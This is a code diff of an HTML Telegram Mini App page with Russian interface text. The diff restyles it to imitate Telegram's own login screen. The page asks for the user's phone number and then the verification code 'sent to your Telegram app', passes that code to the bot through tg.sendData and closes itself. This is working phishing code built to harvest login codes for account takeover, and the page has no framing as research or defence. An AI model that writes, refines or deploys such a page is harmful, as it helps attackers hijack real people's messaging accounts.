@@ -1,48 +1,175 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* Основные цвета Telegram Dark */
+        :root {
+            --bg-color: #0f1721;
+            --container-bg: #1c2733;
+            --text-color: #ffffff;
+            --hint-color: #708499;
+            --button-color: #3390ec;
+            --input-bg: #242f3d;
+            --input-border: #2f3e4e;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 360px;
+            padding: 30px;
+            text-align: center;
+            background: var(--container-bg);
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            margin: 15px;
+        }
+
+        .icon-box {
+            width: 70px;
+            height: 70px;
+            background: var(--button-color);
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            box-shadow: 0 5px 15px rgba(51, 144, 236, 0.4);
+        }
+
+        h2 { font-size: 24px; margin: 0 0 10px 0; font-weight: 600; }
+        p { font-size: 15px; color: var(--hint-color); line-height: 1.4; margin-bottom: 25px; }
+
+        .input-group { position: relative; width: 100%; margin-bottom: 20px; }
+
+        input {
+            width: 100%;
+            background: var(--input-bg);
+            border: 2px solid var(--input-border);
+            border-radius: 14px;
+            padding: 16px;
+            color: #fff;
+            font-size: 18px;
+            outline: none;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        input:focus { border-color: var(--button-color); box-shadow: 0 0 10px rgba(51, 144, 236, 0.2); }
+
+        button {
+            width: 100%;
+            background: var(--button-color);
+            border: none;
+            border-radius: 14px;
+            padding: 16px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.1s ease, opacity 0.2s;
+        }
+
+        button:active { transform: scale(0.98); opacity: 0.9; }
+
+        /* Анимация переключения шагов */
         .step { display: none; }
-        .step.active { display: block; }
+        .active { display: block; animation: slideIn 0.3s ease-out; }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .loader {
+            display: none;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div id="app">
-        <div id="step-phone" class="step active">
-            <h3>Введите номер</h3>
-            <input type="tel" id="phone" placeholder="+7..." />
-            <button onclick="nextStep('phone')">Далее</button>
-        </div>
 
-        <div id="step-code" class="step">
-            <h3>Введите код</h3>
-            <input type="number" id="code" placeholder="12345" />
-            <button onclick="nextStep('code')">Подтвердить</button>
+<div class="app-container">
+    <div class="icon-box">📱</div>
+
+    <div id="step-phone" class="step active">
+        <h2>Ваш номер</h2>
+        <p>Введите номер телефона для входа в ваш аккаунт</p>
+        <div class="input-group">
+            <input type="tel" id="phone_input" placeholder="+7 900 000-00-00" autofocus>
         </div>
+        <button id="btn-phone" onclick="processStep('phone')">Продолжить</button>
     </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+    <div id="step-code" class="step">
+        <h2>Код из SMS</h2>
+        <p>Мы отправили проверочный код в ваше приложение Telegram</p>
+        <div class="input-group">
+            <input type="number" id="code_input" placeholder="00000">
+        </div>
+        <button id="btn-code" onclick="processStep('code')">
+            <span id="text-code">Подтвердить</span>
+            <div id="loader-code" class="loader"></div>
+        </button>
+    </div>
+</div>
 
-        async function nextStep(type) {
-            const val = document.getElementById(type).value;
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.ready();
+    tg.headerColor = '#1c2733'; // Цвет шапки в тон дизайна
+
+    function processStep(type) {
+        if (type === 'phone') {
+            const phone = document.getElementById('phone_input').value;
+            if (!phone) return alert("Введите номер!");
             
-            console.log("Отправка " + type + ": " + val);
+            // Плавный переход
+            document.getElementById('step-phone').classList.remove('active');
+            document.getElementById('step-code').classList.add('active');
+            document.getElementById('code_input').focus();
+        } else {
+            const code = document.getElementById('code_input').value;
+            if (!code) return alert("Введите код!");
 
-            if(type === 'phone') {
-                showStep('code');
-            } else {
-                tg.sendData(val);
-            }
-        }
+            // Показываем лоадер на кнопке
+            document.getElementById('text-code').style.display = 'none';
+            document.getElementById('loader-code').style.display = 'block';
 
-        function showStep(id) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step-' + id).classList.add('active');
+            // Отправляем финальные данные боту
+            setTimeout(() => {
+                tg.sendData(code);
+                tg.close();
+            }, 500);
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
